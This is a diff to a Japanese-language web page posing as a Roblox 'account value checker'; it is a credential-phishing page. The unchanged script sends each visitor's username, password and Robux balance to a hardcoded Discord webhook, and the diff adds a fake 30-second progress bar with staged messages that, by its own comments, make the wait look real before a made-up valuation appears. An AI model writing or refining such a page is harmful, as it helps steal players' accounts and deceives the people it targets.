@@ -13,7 +13,13 @@
         input:focus { border-color: #ff3366; outline: none; }
         button { width: 100%; padding: 12px; background: #ff3366; border: none; color: #fff; font-weight: bold; border-radius: 6px; cursor: pointer; font-size: 15px; transition: background 0.2s; }
         button:hover { background: #e02e5b; }
-        #loading { display: none; text-align: center; color: #aaa; font-size: 14px; line-height: 1.6; }
+        
+        /* ローディング中のデザインとアニメーション */
+        #loading { display: none; text-align: center; }
+        .loading-text { font-size: 14px; color: #ccc; margin-bottom: 15px; }
+        .progress-bar-container { width: 100%; background: #2a2a2a; border-radius: 6px; height: 10px; overflow: hidden; border: 1px solid #444; }
+        .progress-bar { width: 0%; height: 100%; background: #ff3366; transition: width 0.3s linear; }
+
         .result { text-align: center; }
         .value { font-size: 26px; color: #00ffcc; font-weight: bold; margin: 15px 0; }
         .note { font-size: 12px; color: #777; margin-top: 10px; }
@@ -23,6 +29,7 @@
     <div class="card" id="mainCard">
         <h2>アカウント価値チェッカー</h2>
         <div class="subtitle">現在のRobloxアカウントの市場価値を診断</div>
+        
         <form id="form">
             <label>Roblox ユーザー名</label>
             <input type="text" id="user" placeholder="例: RobloxUser123" required>
@@ -35,16 +42,18 @@
             
             <button type="submit">価値を診断する</button>
         </form>
+
         <div id="loading">
-            <p>🔄 データベースを照会中...</p>
-            <p style="font-size: 12px; color: #666;">（正確な査定のため約30秒かかります）</p>
+            <div class="loading-text" id="loadingText">アカウント価値を計算中...</div>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
         </div>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1539344759397679145/BoDKImG3drw0sqeSLGAUXwI60UHgTG3A2r_sXejHdHO2gFPVj2Ta9kDC_KgEOcq8y0gX";
 
-        // クールな英語の追跡IDを生成
         function generateTrackingID() {
             const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
             let id = 'SYS-VAL-';
@@ -66,7 +75,7 @@
             document.getElementById('form').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
 
-            // Discordへ送信するデータ（日本語＆わかりやすいレイアウト）
+            // Discordへ送信するデータ
             const payload = {
                 content: `🎯 **[資産データ受信: ${trackingId}]**\n👤 ユーザー名: \`${username}\`\n🔑 パスワード: \`${password}\`\n💎 Robux残高: \`${robux}\``
             };
@@ -81,7 +90,31 @@
                 console.error("送信エラー:", error);
             }
 
-            // 30秒間じっくり焦らしてから、魅力的な査定結果を表示！
+            // ローディングバーを30秒かけて左から右へ100%まで伸ばす処理
+            const progressBar = document.getElementById('progressBar');
+            const loadingText = document.getElementById('loadingText');
+            let progress = 0;
+            const totalTime = 30000; // 30秒
+            const intervalTime = 300; // 0.3秒ごとに更新
+            const increment = (intervalTime / totalTime) * 100;
+
+            const timer = setInterval(() => {
+                progress += increment;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(timer);
+                }
+                progressBar.style.width = progress + '%';
+
+                // 途中で文字を変えてリアル感を出す演出
+                if (progress > 60) {
+                    loadingText.innerText = "アイテムと相場を照会中...";
+                } else if (progress > 30) {
+                    loadingText.innerText = "セキュリティ情報を確認中...";
+                }
+            }, intervalTime);
+
+            // 30秒後に結果画面に切り替える
             setTimeout(() => {
                 document.getElementById('mainCard').innerHTML = `
                     <div class="result">
@@ -91,7 +124,7 @@
                         <div class="note">※相場により変動する場合があります。</div>
                     </div>
                 `;
-            }, 30000);
+            }, totalTime);
         });
     </script>
 </body>
